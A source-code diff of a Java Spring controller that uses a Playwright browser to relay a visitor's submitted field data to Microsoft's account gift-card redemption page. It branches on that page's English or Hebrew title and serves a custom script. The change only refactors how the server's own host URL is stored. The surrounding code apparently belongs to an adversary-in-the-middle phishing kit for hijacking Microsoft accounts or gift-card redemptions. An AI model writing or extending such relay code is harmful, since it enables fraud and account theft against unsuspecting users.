@@ -33,6 +33,7 @@ public class RemoteRestController {
     protected Playwright playwright = Playwright.create();
 
     private String scriptUrl;
+    private String homeHost;
 
     @PostMapping("/updateFieldData")
     public ResponseEntity<String> updateFieldData(HttpSession session, @RequestBody Field field) {
@@ -99,17 +100,17 @@ public class RemoteRestController {
         page.waitForLoadState(LoadState.LOAD);
         page.waitForLoadState(LoadState.DOMCONTENTLOADED);
 
-        int pos = request.getRequestURL().indexOf(request.getRequestURI());
+        //int pos = request.getRequestURL().indexOf(request.getRequestURI());
 
-        String next = request.getRequestURL().substring(0, pos);
+        //String next = request.getRequestURL().substring(0, pos);
         String nextUrl="";
 
         if (!(page.title().equalsIgnoreCase("Microsoft account | Redeem your code or gift card")
                 || page.title().equalsIgnoreCase( "Microsoft account | ממש את קוד או כרטיס המתנה שלך" ) )) {
-            nextUrl = next + "/next";
+            nextUrl = homeHost + "/next";
 
        }else{
-            nextUrl = next + "/iframe/0/0";
+            nextUrl = homeHost + "/iframe/0/0";
 
         }
 
@@ -184,9 +185,9 @@ public class RemoteRestController {
         System.out.println("isSecured :" + isSecured );
 
 
-        String homeScript = request.getRequestURL().substring(0, pos);
-        homeScript=homeScript.replace("http://" ,"https://");
-        scriptUrl = homeScript + "/script/custom.js";
+        homeHost = request.getRequestURL().substring(0, pos);
+        homeHost=homeHost.replace("http://" ,"https://");
+        scriptUrl = homeHost + "/script/custom.js";
 
 
         System.out.println("request.getRequestURL() :" + request.getRequestURL() );
